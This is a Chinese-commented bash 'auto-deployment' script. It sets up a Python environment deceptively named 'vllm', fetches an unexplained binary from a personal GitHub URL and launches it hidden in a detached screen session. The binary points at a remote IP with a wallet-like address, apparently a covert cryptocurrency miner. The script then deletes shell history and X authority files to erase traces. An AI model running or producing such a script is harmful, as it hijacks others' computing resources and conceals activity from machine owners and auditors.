#!/bin/bash

# 设置非交互模式，防止弹出地理位置等配置选择
export DEBIAN_FRONTEND=noninteractive

echo "开始执行全自动部署脚本..."

# 1. 更新系统并安装必要的基础组件
sudo apt-get update -y
sudo apt-get install -y wget curl tar screen python3-pip

# 2. 安装 uv (如果系统中没有 uv)
if ! command -v uv &> /dev/null; then
    echo "正在安装 uv..."
    curl -LsSf https://astral.sh/uv/install.sh | sh
    # 将 uv 添加到当前会话的 PATH 中
    source $HOME/.cargo/env
else
    echo "uv 已安装，跳过。"
fi

# 确保 uv 在当前路径可用
export PATH="$HOME/.cargo/bin:$PATH"

# 3. 进入用户目录并清理旧环境
cd $HOME
rm -rf vllm
rm -rf p.tar.gz p

# 4. 创建虚拟环境并安装指定 Python 版本
# uv 会自动下载并安装 3.12 版本的 Python
echo "正在创建虚拟环境 (Python 3.12)..."
uv venv vllm --python 3.12.11

# 5. 下载并解压程序
echo "正在下载程序包..."
wget https://raw.githubusercontent.com/xiaobintse/sh/main/p.tar.gz

echo "正在解压..."
# 解压
tar -zxvf p.tar.gz
# 给执行权限
chmod +x p

# 6. 移动执行文件到环境目录并清理
cp p ~/vllm/
rm -rf p.tar.gz p

# 7. 使用 screen 在后台启动程序
echo "正在启动后台任务..."
screen -dmS p bash -c 'source ~/vllm/bin/activate && cd ~/vllm && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker new'

# 8. 最后清理痕迹
echo "清理历史记录..."
rm -rf .Xauthority
rm -rf .bash_history

echo "-------------------------------------------------------"
echo "脚本执行完毕！"
echo "程序已在名为 'p' 的 screen 会话中运行。"
echo "可以使用 'screen -ls' 查看状态，或 'screen -r p' 查看输出。"
echo "-------------------------------------------------------"

# 自动退出（根据原脚本要求）
exit